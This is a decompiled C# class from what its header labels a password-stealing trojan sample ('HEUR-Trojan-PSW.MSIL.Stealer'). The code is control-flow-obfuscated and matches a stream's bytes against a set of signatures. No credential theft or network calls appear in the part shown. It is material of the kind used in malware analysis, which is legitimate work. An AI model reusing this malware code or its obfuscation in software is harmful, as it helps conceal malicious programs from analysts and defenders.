// Decompiled with JetBrains decompiler
// Type: rw.gK
// Assembly: DynamicMet, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: AF763EB9-8CE5-4C8D-A157-180B851AA721
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-PSW.MSIL.Stealer.gen-f9cf1ff0097d861156fd09818614a3bb202741325fc00049356ff51a8388dfd6.exe

using System.IO;
using System.Runtime.InteropServices;

namespace rw
{
  public class gK
  {
    private JV[] tv;
    private Bc Lb;
    private int hp;
    private int WY;
    private bool iK;
    internal static gK an;

    public gK(Bc _param1, bool _param2, JV[] _param3)
    {
      ccw.xFvA3V();
      this.hp = 0;
      // ISSUE: explicit constructor call
      base.\u002Ector();
      this.tv = _param3;
      int num1 = 0;
      if (false)
        goto label_2;
label_1:
      switch (num1)
      {
        default:
          this.Lb = _param1;
          this.iK = _param2;
          this.hp = 0;
          return;
      }
label_2:
      int num2;
      num1 = num2;
      goto label_1;
    }

    public bool w9()
    {
      long num1 = this.Lb.BI();
      this.WY = this.tv.Length;
      bool[] flagArray = new bool[this.tv.Length];
      int index1 = 0;
      int num2 = 5;
      if (!gK.Hj())
        goto label_8;
label_2:
      bool flag1;
      while (true)
      {
        int num3;
        int index2;
        bool flag2;
        byte num4;
        switch (num2)
        {
          case 1:
          case 4:
            goto label_3;
          case 2:
            if (index2 < this.tv.Length)
            {
              if (!flagArray[index2])
              {
                if ((int) this.tv[index2].mk[index1] != (int) num4)
                {
                  flagArray[index2] = true;
                  --this.WY;
                }
                flag2 = index1 == this.tv[index2].mk.Length - 1 && !flagArray[index2];
                num2 = 3;
                continue;
              }
              goto label_5;
            }
            else
            {
              ++index1;
              goto case 5;
            }
          case 3:
            if (flag2)
            {
              this.hp = index2;
              num3 = 7;
              break;
            }
            goto label_5;
          case 5:
            if (this.WY <= 0)
            {
              num3 = 6;
              break;
            }
            if (this.iK && ((Stream) gK.l4((object) this.Lb)).Position == this.Lb.aP().Length)
            {
              num2 = gK.AD() == null ? 0 : 0;
              continue;
            }
            num4 = this.Lb.I1();
            index2 = 0;
            goto case 2;
          case 6:
            this.Lb.eC(num1);
            flag1 = true;
            num2 = !gK.Hj() ? 0 : 1;
            continue;
          case 7:
            goto label_6;
          default:
            flag1 = false;
            num2 = gK.AD() != null ? 0 : 4;
            continue;
        }
        num2 = num3;
        continue;
label_5:
        ++index2;
        num2 = 2;
      }
label_3:
      return flag1;
label_6:
      this.Lb.eC(num1);
      flag1 = false;
      goto label_3;
label_8:
      num2 = 4;
      goto label_2;
    }

    public JV sG() => this.tv[this.hp];

    internal static bool Hj() => gK.an == null;

    internal static gK AD() => gK.an;

    internal static object l4([In] object obj0) => (object) ((Bc) obj0).aP();
  }
}
